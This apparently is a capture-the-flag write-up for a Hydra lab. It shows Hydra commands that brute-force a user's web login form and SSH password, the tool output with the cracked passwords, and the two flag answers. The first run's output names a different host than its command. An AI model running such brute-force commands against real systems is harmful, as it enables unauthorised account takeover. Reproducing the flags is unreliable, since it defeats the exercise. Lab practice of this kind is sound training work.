# Hydra

## Use Hydra to bruteforce molly's web password. What is flag 1?

```
$ hydra -l molly -P /usr/share/wordlists/passwords/rockyou.txt 10.18.22.17 http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-30 11:55:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.26.252:80/login:username=^USER^&password=^PASS^:F=incorrect
[80][http-post-form] host: 10.18.22.17   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-30 11:55:45
```

**Flag 1 :** `THM{2673a7dd116de68e85c48ec0b1f2612e}`


## Use Hydra to bruteforce molly's SSH password. What is flag 2?

```
$ hydra -l molly -P /usr/share/wordlists/passwords/rockyou.txt 10.18.22.17 -t 4 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-30 11:59:25
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://10.18.22.17:22/
[22][ssh] host: 10.18.22.17   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-30 11:59:35
```

**Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`

